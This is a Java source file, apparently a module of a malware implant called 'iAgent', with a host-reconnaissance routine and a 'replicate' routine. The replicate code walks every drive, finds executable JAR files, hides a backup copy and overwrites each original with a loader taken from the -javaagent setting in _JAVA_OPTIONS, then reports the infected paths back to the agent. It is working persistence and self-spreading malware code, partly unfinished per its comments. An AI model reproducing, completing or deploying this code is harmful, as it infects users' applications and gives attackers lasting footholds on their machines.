package com.nocebo.nCore;

import java.io.File;
import java.io.IOException;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.FileVisitOption;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.BasicFileAttributes;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.stream.Collectors;
import java.util.List;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;

import org.w3c.dom.Document;

import com.nocebo.nCore.iAgent.utilitarian;

public class autoLib
{
    public void metadata(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
                
        metadata.put("arch",System.getProperty("os.arch"));
        metadata.put("os",System.getProperty("os.name"));
        metadata.put("version",System.getProperty("os.version"));
        metadata.put("user",System.getProperty("user.name"));
        metadata.put("cwd",System.getProperty("user.dir"));
        metadata.put("jre",System.getProperty("java.runtime.version"));
        metadata.put("interfaces",nUtil.getAddress().toString());
        metadata.put("hostname",nUtil.getHostname());
        metadata.put("uuid",iAgent.sessUUID);
        metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
        metadata.put("error","");

        Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
        iAgent.output.add(metaDoc);
    }

    public void replicate(String[] args) throws IOException, SocketException, UnknownHostException, ParserConfigurationException, TransformerException
    {
        
        Hashtable<String,String> metadata = new Hashtable<>();
        iAgent.utilitarian nUtil = new iAgent.utilitarian();
        String loaderPath = new String();
        byte[] loaderBytes = new byte[]{};

        try
        {
            String[] envVarPath = System.getenv("_JAVA_OPTIONS").split(" ");
            for (int p=0;p<envVarPath.length;p++)
            {
                if (envVarPath[p].contains("-javaagent"))
                {
                    String[] splitPath = envVarPath[p].split(":");
                    loaderPath = splitPath[1];
                    loaderBytes = Files.readAllBytes(Paths.get(loaderPath));
                    break;
                }
            }
        }
        catch (Exception e)
        {

        }
        
        while (iAgent.shutdown != 1)
        {
            ArrayList<Path> rootChk = new ArrayList();
            ArrayList<Path> fileNames = new ArrayList();
            File[] rootSet = File.listRoots();
            ArrayList<String> listFileNames = new ArrayList();

            for (int f=0;f<rootSet.length;f++)
            {
                Path rootPath = Paths.get(rootSet[f].getPath());
                if (!rootChk.contains(rootPath))
                {
                    rootChk.add(rootPath);
                    try {
                        Files.walkFileTree(
                            rootPath
                        , 
                        new HashSet<FileVisitOption>(Arrays.asList(FileVisitOption.FOLLOW_LINKS)),
                        Integer.MAX_VALUE, new SimpleFileVisitor<Path>() {
                            @Override
                            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) 
                                    throws IOException {
                        String stringFileName = file.toString();

                        if (stringFileName.contains(".jar") && !(stringFileName.contains("Java")) && !(stringFileName.contains("jdk")) && !(stringFileName.contains("jre")))
                        {
                                        fileNames.add(file);
                        }
                                return FileVisitResult.CONTINUE;
                            }
                            
                            @Override
                            public FileVisitResult visitFileFailed(Path file, IOException e) 
                                    throws IOException {
                                return FileVisitResult.SKIP_SUBTREE;
                            }
                            
                            @Override
                            public FileVisitResult preVisitDirectory(Path dir,
                                                                    BasicFileAttributes attrs) 
                                    throws IOException {
                                return FileVisitResult.CONTINUE;
                            }
                        });
                    } catch (IOException e) {
                        // idgaf ?
                    }
                }
            
                for (int r=0;r<fileNames.size();r++)
                {
                    if (chkJarMain(fileNames.get(r),nUtil))
                    {
                        try
                        {
                            File jarFile = (fileNames.get(r).toFile());
                            //check if bak-jarname.jar already exists, if so skip
                            String parent = jarFile.getParent();
                            
                            String bakJarPath = String.format("%s%s.bak-%s",parent,File.separator,jarFile.getName());

                            //need to add some logic that precludes the actual jdk jars from getting smashed by this
                            if (!new File(bakJarPath).isFile())
                            {
                                //copy to bak-jarname.jar
                                Files.copy(Paths.get(jarFile.getAbsolutePath()), Paths.get(bakJarPath), StandardCopyOption.REPLACE_EXISTING);

                                //hide bak-jarname.jar
                                if (System.getProperty("os.name").toLowerCase().contains("win"))
                                {
                                    Files.setAttribute(Paths.get(bakJarPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
                                }

                                Files.write(Paths.get(jarFile.getAbsolutePath()), loaderBytes);
                                
                                //create jarname.jar containing loader, downloaded from revamped download endpoint
                                //I need to figure out the loader first
                            }
                        }
                        catch (Exception e)
                        {
                            fileNames.remove(r);
                        }
                    }

                    //implict else: no main class, ignoring
                    listFileNames.add(fileNames.get(r).toString());
                    metadata.put("persistedPaths",String.join(",",listFileNames));
                    metadata.put("uuid",iAgent.sessUUID);
                    metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                    metadata.put("error","");
        
                    Document metaDoc = nUtil.outputToXmlDoc("replication",metadata);
                    iAgent.output.add(metaDoc);

                }
            }
            
        }
        
    }

    //helper functions

    public static boolean chkJarMain(Path jarPath, utilitarian nUtil) throws IOException
    {
		JarFile jarfile = new JarFile(new File(jarPath.toString()));
		Enumeration<JarEntry> enu= jarfile.entries();
    		while(enu.hasMoreElements())
    		{
			
			JarEntry je = enu.nextElement();
			if (je.getName().contains("META-INF/MANIFEST"))
			{
				return (nUtil.streamToString(jarfile.getInputStream(je)).contains("Main-Class:"));
			}
		}
		return false;

    }

}